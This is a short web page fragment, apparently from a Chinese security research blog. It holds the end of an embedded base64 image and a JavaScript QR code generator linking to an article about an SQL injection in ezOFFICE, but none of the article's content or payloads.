0bjxNU/gsBDI9iDosdy2CKPfcxDffPfVYZ4zD3MfosMn2tMRPjNAtzfumTahXZz5xs0Bw/8NYuWbLzwsxKYbX/MEtv+m3m9f26rqOsy33nNySB6C6h1h7tcZqiA+BHt/cYgHwdKuFIx5kKcbrnFIDoLpfnx8SoCHX8CHVr+uKggH7j/LerzZ1/bf1GtT+1qdc5+pa8h2zUN4ebMy19GsuhwyT13Un2HPrDg8n73q8576onpHfcj99NX3eH8P2T+NN7jevodAtgfXsJ/92dZ7ds//ts8Z8HletRVCsvreW1SHMQdz3vtW/eoijPPUC+9PSD2FN6ptIW77DFdnh3HrEA7B3gfRIbjy1T2XXFQvVBNhnF2ZKhj1VV69eqpg3mdOrGyVvGN5VV0vvi2kyF2vfwKHhUDeAhhxddTa9L5WOci8r/rO7n2QeXBEs/aKkKy+CKNuvvvqIox9EA4jOsc+uaheeFiIoRtf8wS+fSG15Sp/OXVdJYe8PfLyquRiaVWQPARLOytndOx9MJ/Z++SQvLzPW3HzkH75DL99IbOb3Nr1J/B/LwTGrUO4bwuMXF1cHRXGPnMQHY5oRoQxo75CSF4fws/Oav4qQuaah3Dg/rOsx5t9HT4hvg0dV+c2d+ZD3gJzMHJ10bkw5tR7rnQ1sbQqOYyzul7ZKvW6roKxD+YcRt05Ys3a10w/LMTQja95AttCINuF57g6JqTPNwDCIWgfjFzdPnnH7ssh8+AT9ZwhFyFZuTkR4stF8+KZDuMcGLn9EB24v4c83uxr+4S82bn+s8f5HwAAAP//YAI59wAAAAZJREFUAwCagminY7hypAAAAABJRU5ErkJggg==)

手机扫码阅读

安全研究工具


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/defaultroot-ezOFFICE-getNextAutoCode-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 